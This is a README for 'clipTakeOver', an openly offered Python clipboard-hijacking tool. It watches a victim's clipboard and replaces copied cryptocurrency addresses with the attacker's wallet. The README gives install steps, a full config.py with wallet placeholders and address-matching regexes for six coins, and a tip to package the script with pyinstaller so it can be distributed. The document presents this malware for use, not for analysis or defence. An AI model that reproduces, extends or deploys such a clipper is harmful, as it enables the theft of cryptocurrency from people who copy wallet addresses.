# clipTakeOver

clipTakeOver is cryptocurrency clipboard hijacking tool build base on regex which mean it will listen on users clipboard once the user copy his for example Bitcoin address the tools will replace it with your address .

## Installation

You need to install clipboard lib using the command below

```bash
pip install clipboard
```

## Usage

Before you running the script you need to change some stuff in config.py

```python

'''
    _set_Sleep_Time : = value (float)

    used to set up delay on checking the Clipboard Keep it low otherwise you will miss some copying 
'''
_set_Sleep_Time = 0.8

'''
    crypto_owner is dict which store your crypto address these address will replaced with 
    victim address You have to change them to your wallet public address

    if you want to target particular crypto replace the other values with empty string "" or None 

    exmaple: 

    crypto_owner = {
        "Ethereum" : "0xdafea492d9c6733ae3d56b7ed1adb60692c98bc5"
        "Bitcoin"       :    "",
        "Monero"        :    "",
        "Dash"          :    "",
        "Ripple"        :    "",
        "bitcoincash"   :    ""
    }


'''
crypto_owner = {
    "Ethereum"      :    "Ethereum wallet public address",
    "Bitcoin"       :    "Bitcoin wallet public address",
    "Monero"        :    "Monero wallet public address",
    "Dash"          :    "Dash wallet public address",
    "Ripple"        :    "Ripple wallet public address",
    "bitcoincash"   :    "bitcoincash wallet public address"
}

'''
    crypto_db_Rg is dataset used regex to match user clipboard input if clipboard match 
    any of these values it will replace it with your own wallet public address for particular crypto
    if the address regex pattern not found in the dataset the program will skip the replacments 
    for that value

    Changing the regex values may lead to False Positive In case if you want to add a new crypto 
    you must modify the crypto_owner also to accept and replace with your wallet address

    exmaple : -

    crypto_db_Rg = {
        "dogcoin" : r"your regex"
    }

    add dogcoin also to crypto_owner

    crypto_owner = {
        ....
        "dogcoin"  : "Your wallet"
    }


'''
crypto_db_Rg = {
    "Ethereum"      :    r"^0x[a-fA-F0-9]{40}$",
    "Bitcoin"       :    r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
    "Monero"        :    r"^4([0-9AB]{1})([0-9a-zA-Z]{93})$",
    "Dash"          :    r"X[1-9A-HJ-NP-Za-km-z]{33}$",
    "Ripple"        :    r"^([r])([1-9A-HJ-NP-Za-km-z]{24,34})$",
    "bitcoincash"   :    r"((bitcoincash|bchreg):)?(q|p)[a-z0-9]{41}"
}



```

after that simply you could run the script as following :-

```bash
python clipTakeOver.py
```
You could also use [pyinstaller](https://pypi.org/project/pyinstaller/)

if the program show no output that mean the program running you could copy some address for testing .

## cryptocurrency support
- Bitcoin
- Ethereum
- Monero
- Dash
- Ripple
- bitcoincash

Feel Free to add more .


## License
[MIT](https://choosealicense.com/licenses/mit/)